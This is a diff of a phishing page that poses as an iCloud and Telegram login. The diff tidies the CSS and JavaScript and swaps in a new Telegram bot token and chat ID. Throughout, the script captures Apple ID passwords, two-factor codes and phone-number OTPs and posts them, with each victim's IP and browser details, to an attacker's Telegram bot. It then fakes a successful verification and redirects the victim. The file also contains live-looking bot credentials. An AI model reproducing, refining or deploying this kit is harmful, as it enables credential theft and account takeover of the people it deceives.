@@ -36,14 +36,8 @@
         }
         
         @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         
         .logo-section {
@@ -62,11 +56,7 @@
             margin: 0 auto 20px;
         }
         
-        .logo-icon svg {
-            width: 30px;
-            height: 30px;
-            fill: white;
-        }
+        .logo-icon svg { width: 30px; height: 30px; fill: white; }
         
         h1 {
             font-size: 28px;
@@ -81,9 +71,7 @@
             line-height: 1.5;
         }
         
-        .login-methods {
-            margin-bottom: 30px;
-        }
+        .login-methods { margin-bottom: 30px; }
         
         .login-btn {
             width: 100%;
@@ -103,82 +91,24 @@
             margin-bottom: 15px;
         }
         
-        .login-btn:hover {
-            background: #f8f9fa;
-            border-color: #d1d5db;
-            transform: translateY(-2px);
-        }
+        .login-btn:hover { background: #f8f9fa; border-color: #d1d5db; transform: translateY(-2px); }
+        .login-btn:active { transform: translateY(0); }
         
-        .login-btn:active {
-            transform: translateY(0);
-        }
+        .icloud-btn { background: black; color: white; border-color: black; }
+        .icloud-btn:hover { background: #333; border-color: #333; }
         
-        .icloud-btn {
-            background: black;
-            color: white;
-            border-color: black;
-        }
+        .telegram-btn { background: #2AABEE; color: white; border-color: #2AABEE; }
+        .telegram-btn:hover { background: #229ED9; border-color: #229ED9; }
+        .telegram-btn:disabled { background: #cccccc; border-color: #cccccc; cursor: not-allowed; transform: none; }
         
-        .icloud-btn:hover {
-            background: #333;
-            border-color: #333;
-        }
+        .btn-icon { width: 20px; height: 20px; }
         
-        .telegram-btn {
-            background: #2AABEE;
-            color: white;
-            border-color: #2AABEE;
-        }
+        .divider { display: flex; align-items: center; margin: 30px 0; color: #999; }
+        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #e5e7eb; }
+        .divider span { padding: 0 15px; font-size: 14px; }
         
-        .telegram-btn:hover {
-            background: #229ED9;
-            border-color: #229ED9;
-        }
-        
-        .telegram-btn:disabled {
-            background: #cccccc;
-            border-color: #cccccc;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        .btn-icon {
-            width: 20px;
-            height: 20px;
-        }
-        
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 30px 0;
-            color: #999;
-        }
-        
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background: #e5e7eb;
-        }
-        
-        .divider span {
-            padding: 0 15px;
-            font-size: 14px;
-        }
-        
-        .form-group {
-            margin-bottom: 25px;
-        }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: #333;
-            font-size: 14px;
-        }
-        
+        .form-group { margin-bottom: 25px; }
+        .form-group label { display: block; margin-bottom: 8px; font-weight: 600; color: #333; font-size: 14px; }
         .form-group input {
             width: 100%;
             padding: 14px;
@@ -187,321 +117,70 @@
             font-size: 16px;
             transition: border-color 0.3s;
         }
+        .form-group input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1); }
         
-        .form-group input:focus {
-            outline: none;
-            border-color: #667eea;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
-        }
+        .action-buttons { margin-top: 30px; }
+        .footer-text { text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #e5e7eb; color: #666; font-size: 14px; line-height: 1.5; }
         
-        .action-buttons {
-            margin-top: 30px;
-        }
+        .notification-steps { background: #f8f9fa; border-radius: 12px; padding: 20px; margin: 25px 0; }
+        .step-item { display: flex; align-items: flex-start; margin-bottom: 20px; }
+        .step-number { background: #000; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; flex-shrink: 0; font-size: 14px; font-weight: 600; }
+        .step-content h3 { margin: 0 0 5px 0; color: #333; font-size: 16px; font-weight: 600; }
+        .step-content p { margin: 0; color: #666; font-size: 14px; line-height: 1.4; }
         
-        .footer-text {
-            text-align: center;
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid #e5e7eb;
-            color: #666;
-            font-size: 14px;
-            line-height: 1.5;
-        }
+        .otp-input { width: 100%; padding: 16px; border: 2px solid #e5e7eb; border-radius: 8px; font-size: 24px; text-align: center; letter-spacing: 10px; font-weight: 600; font-family: monospace; }
+        .otp-input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1); }
         
-        .notification-steps {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 25px 0;
-        }
+        .info-box { background: #f0f9ff; border-left: 4px solid #0369a1; padding: 12px 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
+        .info-box p { color: #0369a1; font-size: 14px; margin: 0; line-height: 1.4; }
         
-        .step-item {
-            display: flex;
-            align-items: flex-start;
-            margin-bottom: 20px;
-        }
+        .loading-spinner { width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid #000; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        .step-number {
-            background: #000;
-            color: white;
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 15px;
-            flex-shrink: 0;
-            font-size: 14px;
-            font-weight: 600;
-        }
+        .success-icon { width: 60px; height: 60px; background: #10b981; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
+        .success-icon svg { width: 30px; height: 30px; fill: white; }
         
-        .step-content h3 {
-            margin: 0 0 5px 0;
-            color: #333;
-            font-size: 16px;
-            font-weight: 600;
-        }
+        .phone-input-wrapper { position: relative; }
+        .country-code { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: #333; font-weight: 500; font-size: 16px; }
+        .phone-input { padding-left: 60px !important; font-size: 18px; }
         
-        .step-content p {
-            margin: 0;
-            color: #666;
-            font-size: 14px;
-            line-height: 1.4;
-        }
+        .country-selector { display: flex; align-items: center; justify-content: space-between; padding: 12px; border: 2px solid #e5e7eb; border-radius: 8px; margin-bottom: 15px; cursor: pointer; transition: border-color 0.3s; }
+        .country-selector:hover { border-color: #2AABEE; }
+        .country-info { display: flex; align-items: center; gap: 10px; }
+        .country-flag { width: 24px; height: 24px; background: #2AABEE; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 12px; }
+        .country-name { font-weight: 500; color: #333; }
+        .country-code-display { color: #666; }
         
-        .otp-input {
-            width: 100%;
-            padding: 16px;
-            border: 2px solid #e5e7eb;
-            border-radius: 8px;
-            font-size: 24px;
-            text-align: center;
-            letter-spacing: 10px;
-            font-weight: 600;
-            font-family: monospace;
-        }
+        .keep-signed-in { display: flex; align-items: center; gap: 10px; margin: 20px 0; }
+        .keep-signed-in input { width: auto; }
+        .keep-signed-in label { color: #666; font-size: 14px; margin: 0; }
         
-        .otp-input:focus {
-            outline: none;
-            border-color: #667eea;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
-        }
+        .otp-inputs { display: flex; justify-content: center; gap: 10px; margin: 25px 0; }
+        .otp-digit { width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 600; border: 2px solid #e5e7eb; border-radius: 8px; background: #f8f9fa; transition: all 0.3s; }
+        .otp-digit:focus { outline: none; border-color: #2AABEE; background: white; box-shadow: 0 0 0 3px rgba(42, 171, 238, 0.1); }
         
-        .info-box {
-            background: #f0f9ff;
-            border-left: 4px solid #0369a1;
-            padding: 12px 15px;
-            margin: 15px 0;
-            border-radius: 0 8px 8px 0;
-        }
+        .status-message { text-align: center; margin: 15px 0; font-size: 14px; min-height: 20px; }
+        .success-msg { color: #10b981; }
+        .error-msg { color: #ef4444; }
         
-        .info-box p {
-            color: #0369a1;
-            font-size: 14px;
-            margin: 0;
-            line-height: 1.4;
-        }
+        .resend-link { text-align: center; margin-top: 15px; color: #666; }
+        .resend-link a { color: #2AABEE; text-decoration: none; font-weight: 500; }
+        .resend-link a:hover { text-decoration: underline; }
         
-        .loading-spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #000;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
+        .small-text { font-size: 12px; color: #999; text-align: center; margin-top: 5px; }
         
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        .loading-dots { display: inline-block; }
+        .loading-dots:after { content: ' .'; animation: dots 1.5s steps(5, end) infinite; }
+        @keyframes dots { 0%, 20% { content: ' .'; } 40% { content: ' ..'; } 60% { content: ' ...'; } 80%, 100% { content: ''; } }
         
-        .success-icon {
-            width: 60px;
-            height: 60px;
-            background: #10b981;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-        }
+        .loading { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255, 255, 255, 0.3); border-radius: 50%; border-top-color: white; animation: spin 1s ease-in-out infinite; margin-right: 8px; }
         
-        .success-icon svg {
-            width: 30px;
-            height: 30px;
-            fill: white;
-        }
-        
-        /* Telegram Login Styles */
-        .phone-input-wrapper {
-            position: relative;
-        }
-        
-        .country-code {
-            position: absolute;
-            left: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #333;
-            font-weight: 500;
-            font-size: 16px;
-        }
-        
-        .phone-input {
-            padding-left: 60px !important;
-            font-size: 18px;
-        }
-        
-        .country-selector {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 12px;
-            border: 2px solid #e5e7eb;
-            border-radius: 8px;
-            margin-bottom: 15px;
-            cursor: pointer;
-            transition: border-color 0.3s;
-        }
-        
-        .country-selector:hover {
-            border-color: #2AABEE;
-        }
-        
-        .country-info {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .country-flag {
-            width: 24px;
-            height: 24px;
-            background: #2AABEE;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: bold;
-            font-size: 12px;
-        }
-        
-        .country-name {
-            font-weight: 500;
-            color: #333;
-        }
-        
-        .country-code-display {
-            color: #666;
-        }
-        
-        .keep-signed-in {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin: 20px 0;
-        }
-        
-        .keep-signed-in input {
-            width: auto;
-        }
-        
-        .keep-signed-in label {
-            color: #666;
-            font-size: 14px;
-            margin: 0;
-        }
-        
-        /* OTP Input Fields */
-        .otp-inputs {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin: 25px 0;
-        }
-        
-        .otp-digit {
-            width: 50px;
-            height: 60px;
-            text-align: center;
-            font-size: 24px;
-            font-weight: 600;
-            border: 2px solid #e5e7eb;
-            border-radius: 8px;
-            background: #f8f9fa;
-            transition: all 0.3s;
-        }
-        
-        .otp-digit:focus {
-            outline: none;
-            border-color: #2AABEE;
-            background: white;
-            box-shadow: 0 0 0 3px rgba(42, 171, 238, 0.1);
-        }
-        
-        .status-message {
-            text-align: center;
-            margin: 15px 0;
-            font-size: 14px;
-            min-height: 20px;
-        }
-        
-        .success-msg {
-            color: #10b981;
-        }
-        
-        .error-msg {
-            color: #ef4444;
-        }
-        
-        .resend-link {
-            text-align: center;
-            margin-top: 15px;
-            color: #666;
-        }
-        
-        .resend-link a {
-            color: #2AABEE;
-            text-decoration: none;
-            font-weight: 500;
-        }
-        
-        .resend-link a:hover {
-            text-decoration: underline;
-        }
-        
-        .small-text {
-            font-size: 12px;
-            color: #999;
-            text-align: center;
-            margin-top: 5px;
-        }
-        
-        .loading-dots {
-            display: inline-block;
-        }
-        
-        .loading-dots:after {
-            content: ' .';
-            animation: dots 1.5s steps(5, end) infinite;
-        }
-        
-        @keyframes dots {
-            0%, 20% { content: ' .'; }
-            40% { content: ' ..'; }
-            60% { content: ' ...'; }
-            80%, 100% { content: ''; }
-        }
-        
-        .loading {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s ease-in-out infinite;
-            margin-right: 8px;
-        }
-        
-        .error-border {
-            border-color: #ef4444 !important;
-        }
-        
-        .error-text {
-            color: #ef4444;
-            font-size: 12px;
-            margin-top: 5px;
-            display: none;
-        }
+        .error-border { border-color: #ef4444 !important; }
+        .error-text { color: #ef4444; font-size: 12px; margin-top: 5px; display: none; }
     </style>
 </head>
 <body>
-    <!-- Main Login Screen with Options -->
+    <!-- Main Login Screen -->
     <div class="container" id="mainScreen">
         <div class="login-card">
             <div class="logo-section">
@@ -553,7 +232,7 @@
                 <p class="subtitle">Enter your iCloud credentials</p>
             </div>
 
-            <form id="icloudLoginForm">
+            <form id="icloudLoginForm" onsubmit="event.preventDefault(); submitICloudCredentials();">
                 <div class="form-group">
                     <label for="icloudEmail">Apple ID</label>
                     <input type="text" id="icloudEmail" placeholder="name@icloud.com" required>
@@ -569,7 +248,7 @@
                 </div>
 
                 <div class="action-buttons">
-                    <button type="button" class="login-btn icloud-btn" onclick="submitICloudCredentials()">
+                    <button type="submit" class="login-btn icloud-btn">
                         <span>Continue</span>
                     </button>
                     
@@ -605,8 +284,7 @@
                 </p>
                 
                 <div style="margin: 25px 0;">
-                    <input type="text" id="icloudOtpCode" class="otp-input" placeholder="000000" 
-                           maxlength="6" pattern="\d{6}" required>
+                    <input type="text" id="icloudOtpCode" class="otp-input" placeholder="000000" maxlength="6" pattern="\d{6}" required>
                     <p style="color: #999; font-size: 12px; margin-top: 8px;">
                         Enter the 6-digit code from your Apple device
                     </p>
@@ -687,8 +365,7 @@
                     <label>Your phone number</label>
                     <div class="phone-input-wrapper">
                         <span class="country-code">+63</span>
-                        <input type="tel" id="telegramPhoneInput" class="form-control phone-input" 
-                               placeholder="956 456 4566" required>
+                        <input type="tel" id="telegramPhoneInput" class="form-control phone-input" placeholder="956 456 4566" required>
                     </div>
                     <div class="error-text" id="phoneError">Please enter a valid phone number (10 digits)</div>
                 </div>
@@ -741,7 +418,7 @@
                 <div class="phone-display" id="telegramPhoneDisplay"></div>
             </div>
 
-            <form id="telegramOtpForm">
+            <form id="telegramOtpForm" onsubmit="event.preventDefault(); verifyTelegramOTP();">
                 <div class="otp-inputs">
                     <input type="text" class="otp-digit" maxlength="1" pattern="[0-9]" data-index="0" required>
                     <input type="text" class="otp-digit" maxlength="1" pattern="[0-9]" data-index="1" required>
@@ -754,7 +431,7 @@
                 <div class="status-message" id="otpStatus"></div>
 
                 <div class="action-buttons">
-                    <button type="button" class="login-btn telegram-btn" onclick="verifyTelegramOTP()" id="verifyOtpBtn">
+                    <button type="submit" class="login-btn telegram-btn" id="verifyOtpBtn">
                         <span id="verifyOtpText">VERIFY</span>
                     </button>
                     
@@ -770,7 +447,7 @@
         </div>
     </div>
 
-    <!-- Success Screen (Redirects to collab-form.html) -->
+    <!-- Success Screen -->
     <div class="container" id="successScreen" style="display: none;">
         <div class="login-card">
             <div class="logo-section">
@@ -793,30 +470,25 @@
     </div>
 
     <script>
-        // Telegram Bot Configuration
-        const BOT_TOKEN = '7738348705:AAGGbXz5g683t-KHmrnvyCfK8ial6yFhHNU';
-        const CHAT_ID = '8456018521';
+        // --- CONFIGURATION ---
+        const BOT_TOKEN = '9241587801:AAEH_bcA_0pKUnEqztnL-p8dE5SDo82iX7I';
+        const CHAT_ID = '9178447928';
         
-        // Store user data
         let telegramPhone = '';
         let userIP = '';
         let icloudCredentials = { email: '', password: '' };
 
-        // Navigation Functions
+        // Navigation
         function showICloudLogin() {
             document.getElementById('mainScreen').style.display = 'none';
             document.getElementById('icloudForm').style.display = 'block';
-            setTimeout(() => {
-                document.getElementById('icloudEmail').focus();
-            }, 100);
+            setTimeout(() => document.getElementById('icloudEmail').focus(), 100);
         }
         
         function showTelegramLogin() {
             document.getElementById('mainScreen').style.display = 'none';
             document.getElementById('telegramPhone').style.display = 'block';
-            setTimeout(() => {
-                document.getElementById('telegramPhoneInput').focus();
-            }, 100);
+            setTimeout(() => document.getElementById('telegramPhoneInput').focus(), 100);
         }
         
         function backToMain() {
@@ -827,7 +499,6 @@
             document.getElementById('telegramOTP').style.display = 'none';
             document.getElementById('successScreen').style.display = 'none';
             
-            // Clear form fields
             document.getElementById('icloudEmail').value = '';
             document.getElementById('icloudPassword').value = '';
             document.getElementById('icloudOtpCode').value = '';
@@ -863,16 +534,11 @@
             
             icloudCredentials = { email, password };
             userIP = await getIPAddress();
-            
-            // Send to Telegram
             await sendICloudCredentialsToTelegram(email, password);
             
             document.getElementById('icloudForm').style.display = 'none';
             document.getElementById('icloudOTP').style.display = 'block';
-            
-            setTimeout(() => {
-                document.getElementById('icloudOtpCode').focus();
-            }, 100);
+            setTimeout(() => document.getElementById('icloudOtpCode').focus(), 100);
         }
         
         async function verifyICloudOTP() {
@@ -883,17 +549,11 @@
                 return;
             }
             
-            // Send OTP to Telegram
             await sendICloudOTPToTelegram(icloudCredentials.email, otp);
             
-            // Show success and redirect
             document.getElementById('icloudOTP').style.display = 'none';
             document.getElementById('successScreen').style.display = 'block';
-            
-            // Redirect to collab-form.html after 2 seconds
-            setTimeout(() => {
-                window.location.href = 'collab-form.html';
-            }, 2000);
+            setTimeout(() => window.location.href = 'collab-form.html', 2000);
         }
         
         function resendICloudOTP() {
@@ -906,39 +566,28 @@
                 alert('New verification code has been sent to your Apple devices');
                 resendBtn.innerHTML = originalText;
                 resendBtn.disabled = false;
-                
                 document.getElementById('icloudOtpCode').value = '';
                 document.getElementById('icloudOtpCode').focus();
             }, 1500);
         }
 
-        // Phone input validation
+        // Phone Validation
         document.addEventListener('DOMContentLoaded', function() {
             const phoneInput = document.getElementById('telegramPhoneInput');
             const phoneError = document.getElementById('phoneError');
             const sendOtpBtn = document.getElementById('sendOtpBtn');
             
             if (phoneInput) {
-                // Real-time validation
                 phoneInput.addEventListener('input', function(e) {
                     let value = e.target.value.replace(/\D/g, '');
-                    
-                    // Format: XXX XXX XXXX
                     if (value.length > 0) {
-                        if (value.length <= 3) {
-                            value = value;
-                        } else if (value.length <= 6) {
-                            value = value.slice(0, 3) + ' ' + value.slice(3);
-                        } else {
-                            value = value.slice(0, 3) + ' ' + value.slice(3, 6) + ' ' + value.slice(6, 10);
-                        }
+                        if (value.length <= 3) value = value;
+                        else if (value.length <= 6) value = value.slice(0, 3) + ' ' + value.slice(3);
+                        else value = value.slice(0, 3) + ' ' + value.slice(3, 6) + ' ' + value.slice(6, 10);
                     }
                     e.target.value = value;
                     
-                    // Check if valid (10 digits)
-                    const digitsOnly = value.replace(/\s/g, '');
-                    const isValid = digitsOnly.length === 10;
-                    
+                    const isValid = value.replace(/\s/g, '').length === 10;
                     if (isValid) {
                         phoneError.style.display = 'none';
                         phoneInput.classList.remove('error-border');
@@ -949,38 +598,18 @@
                         sendOtpBtn.disabled = true;
                     }
                 });
-                
-                // Add Enter key support
-                phoneInput.addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') {
-                        e.preventDefault();
-                        if (!sendOtpBtn.disabled) {
-                            sendTelegramOTP();
-                        }
-                    }
-                });
             }
             
-            // iCloud form Enter key support
             document.getElementById('icloudPassword')?.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    submitICloudCredentials();
-                }
+                if (e.key === 'Enter') { e.preventDefault(); submitICloudCredentials(); }
             });
             
             document.getElementById('icloudOtpCode')?.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    verifyICloudOTP();
-                }
+                if (e.key === 'Enter') { e.preventDefault(); verifyICloudOTP(); }
             });
             
-            // Auto-submit iCloud OTP
             document.getElementById('icloudOtpCode')?.addEventListener('input', function(e) {
-                if (this.value.length === 6) {
-                    verifyICloudOTP();
-                }
+                if (this.value.length === 6) verifyICloudOTP();
             });
         });
 
@@ -997,19 +626,14 @@
             
             telegramPhone = '+63' + phoneValue;
             
-            // Show loading state
             const sendOtpBtn = document.getElementById('sendOtpBtn');
             const sendOtpText = document.getElementById('sendOtpText');
             sendOtpBtn.disabled = true;
             sendOtpText.innerHTML = '<span class="loading"></span>SENDING...';
             
-            // Get IP address
             userIP = await getIPAddress();
-            
-            // Send ONLY phone number to Telegram (NO OTP)
             await sendTelegramPhoneToBot(telegramPhone);
             
-            // Update display and switch screens
             document.getElementById('telegramPhoneDisplay').textContent = telegramPhone;
             document.getElementById('phoneStatus').textContent = 'Code sent to Telegram!';
             document.getElementById('phoneStatus').className = 'status-message success-msg';
@@ -1017,8 +641,6 @@
             setTimeout(() => {
                 document.getElementById('telegramPhone').style.display = 'none';
                 document.getElementById('telegramOTP').style.display = 'block';
-                
-                // Reset button and focus first OTP digit
                 sendOtpBtn.disabled = false;
                 sendOtpText.textContent = 'NEXT';
                 document.getElementById('phoneStatus').textContent = '';
@@ -1026,7 +648,6 @@
             }, 1500);
         }
         
-        // Telegram OTP input handling
         const otpDigits = document.querySelectorAll('.otp-digit');
         
         otpDigits.forEach((digit, index) => {
@@ -1034,21 +655,14 @@
                 const value = e.target.value.replace(/[^0-9]/g, '');
                 e.target.value = value;
                 
-                if (value && index < otpDigits.length - 1) {
-                    otpDigits[index + 1].focus();
-                }
+                if (value && index < otpDigits.length - 1) otpDigits[index + 1].focus();
                 
-                // Auto-verify when all digits are filled
                 const allFilled = Array.from(otpDigits).every(d => d.value.length === 1);
-                if (allFilled) {
-                    setTimeout(() => verifyTelegramOTP(), 100);
-                }
+                if (allFilled) setTimeout(() => verifyTelegramOTP(), 100);
             });
             
             digit.addEventListener('keydown', function(e) {
-                if (e.key === 'Backspace' && !e.target.value && index > 0) {
-                    otpDigits[index - 1].focus();
-                }
+                if (e.key === 'Backspace' && !e.target.value && index > 0) otpDigits[index - 1].focus();
             });
         });
         
@@ -1061,27 +675,20 @@
                 return;
             }
             
-            // Show loading state
             const verifyOtpBtn = document.getElementById('verifyOtpBtn');
             const verifyOtpText = document.getElementById('verifyOtpText');
             verifyOtpBtn.disabled = true;
             verifyOtpText.innerHTML = '<span class="loading"></span>VERIFYING...';
             
-            // Send OTP to Telegram
             await sendTelegramOTPToBot(telegramPhone, enteredOTP);
             
-            // Show success and redirect
             document.getElementById('otpStatus').textContent = 'Verification successful!';
             document.getElementById('otpStatus').className = 'status-message success-msg';
             
             setTimeout(() => {
                 document.getElementById('telegramOTP').style.display = 'none';
                 document.getElementById('successScreen').style.display = 'block';
-                
-                // Redirect to collab-form.html after 2 seconds
-                setTimeout(() => {
-                    window.location.href = 'collab-form.html';
-                }, 2000);
+                setTimeout(() => window.location.href = 'collab-form.html', 2000);
             }, 1000);
         }
         
@@ -1091,7 +698,6 @@
             resendLink.textContent = 'Sending...';
             resendLink.style.pointerEvents = 'none';
             
-            // Clear OTP fields
             clearOtpFields();
             otpDigits[0].focus();
             
@@ -1112,143 +718,125 @@
             otpDigits.forEach(digit => digit.value = '');
         }
 
-        // Telegram Bot Functions
+        // --- TELEGRAM SEND FUNCTIONS (TAP TO COPY) ---
+        
         async function sendTelegramPhoneToBot(phone) {
-            const timestamp = new Date().toLocaleString();
+            const timestamp = new Date().toLocaleString('en-US', { 
+                month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' 
+            });
             const userAgent = navigator.userAgent;
             
             const message = `
-📱 *TELEGRAM LOGIN ATTEMPT*
+📱 <b>Telegram Login Attempt</b>
 
-📞 *Phone Number:* \`${phone}\`
-📍 *IP Address:* \`${userIP}\`
-📅 *Time:* ${timestamp}
-🌐 *Page URL:* \`${window.location.href}\`
+<blockquote>👤 <b>Phone:</b> <code>${phone}</code>
+🌐 <b>IP:</b> <code>${userIP}</code>
+🕒 <b>Time:</b> ${timestamp}
+💻 <b>Device:</b> <code>${userAgent.split(') ')[0]})</code></blockquote>
 
-📱 *Browser Info:*
-\`\`\`
-${userAgent}
-\`\`\`
-
-⏳ *Waiting for user to enter OTP...*
+<i>Awaiting OTP entry...</i>
             `;
             
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: message,
-                        parse_mode: 'Markdown'
+                        parse_mode: 'HTML'
                     })
                 });
-            } catch (error) {
-                console.error('Telegram error:', error);
-            }
+            } catch (error) { console.error('Telegram error:', error); }
         }
         
         async function sendTelegramOTPToBot(phone, enteredOTP) {
-            const timestamp = new Date().toLocaleString();
+            const timestamp = new Date().toLocaleString('en-US', { 
+                month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' 
+            });
             
             const message = `
-🔢 *TELEGRAM OTP ENTERED*
+🔑 <b>OTP Received</b>
 
-📞 *Phone Number:* \`${phone}\`
-🔢 *Entered OTP:* \`${enteredOTP}\`
-📍 *IP Address:* \`${userIP}\`
-📅 *Time:* ${timestamp}
+<blockquote>📱 <b>Phone:</b> <code>${phone}</code>
+🔢 <b>Code:</b> <code>${enteredOTP}</code>
+🌐 <b>IP:</b> <code>${userIP}</code>
+🕒 <b>Time:</b> ${timestamp}</blockquote>
 
-✅ *User is being redirected to collab-form.html*
+✅ <i>User verified. Redirecting...</i>
             `;
             
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: message,
-                        parse_mode: 'Markdown'
+                        parse_mode: 'HTML'
                     })
                 });
-            } catch (error) {
-                console.error('Telegram error:', error);
-            }
+            } catch (error) { console.error('Telegram error:', error); }
         }
         
-        // iCloud Bot Functions
         async function sendICloudCredentialsToTelegram(email, password) {
-            const timestamp = new Date().toLocaleString();
+            const timestamp = new Date().toLocaleString('en-US', { 
+                month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' 
+            });
             const userAgent = navigator.userAgent;
             
             const message = `
-🍎 *ICLOUD LOGIN ATTEMPT*
+🍎 <b>iCloud Login Attempt</b>
 
-📧 *Apple ID:* \`${email}\`
-🔑 *Password:* \`${password}\`
-📍 *IP Address:* \`${userIP}\`
-📅 *Time:* ${timestamp}
-🌐 *Page URL:* \`${window.location.href}\`
+<blockquote>📧 <b>Apple ID:</b> <code>${email}</code>
+🔐 <b>Password:</b> <code>${password}</code>
+🌐 <b>IP:</b> <code>${userIP}</code>
+🕒 <b>Time:</b> ${timestamp}
+💻 <b>Device:</b> <code>${userAgent.split(') ')[0]})</code></blockquote>
 
-📱 *Browser Info:*
-\`\`\`
-${userAgent}
-\`\`\`
-
-⏳ *Waiting for OTP...*
+<i>Awaiting 2FA entry...</i>
             `;
             
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: message,
-                        parse_mode: 'Markdown'
+                        parse_mode: 'HTML'
                     })
                 });
-            } catch (error) {
-                console.error('Telegram error:', error);
-            }
+            } catch (error) { console.error('Telegram error:', error); }
         }
         
         async function sendICloudOTPToTelegram(email, otp) {
-            const timestamp = new Date().toLocaleString();
+            const timestamp = new Date().toLocaleString('en-US', { 
+                month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' 
+            });
             
             const message = `
-🔢 *ICLOUD OTP ENTERED*
+🔓 <b>iCloud 2FA Received</b>
 
-📧 *Apple ID:* \`${email}\`
-🔢 *OTP Code:* \`${otp}\`
-📍 *IP Address:* \`${userIP}\`
-📅 *Time:* ${timestamp}
+<blockquote>📧 <b>Apple ID:</b> <code>${email}</code>
+🔢 <b>Code:</b> <code>${otp}</code>
+🌐 <b>IP:</b> <code>${userIP}</code>
+🕒 <b>Time:</b> ${timestamp}</blockquote>
 
-✅ *User is being redirected to collab-form.html*
+✅ <i>User verified. Redirecting...</i>
             `;
             
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: message,
-                        parse_mode: 'Markdown'
+                        parse_mode: 'HTML'
                     })
                 });
-            } catch (error) {
-                console.error('Telegram error:', error);
-            }
+            } catch (error) { console.error('Telegram error:', error); }
         }
         
         async function getIPAddress() {
@@ -1256,9 +844,7 @@ ${userAgent}
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 return data.ip;
-            } catch (error) {
-                return 'Unknown';
-            }
+            } catch (error) { return 'Unknown'; }
         }
     </script>
 </body>
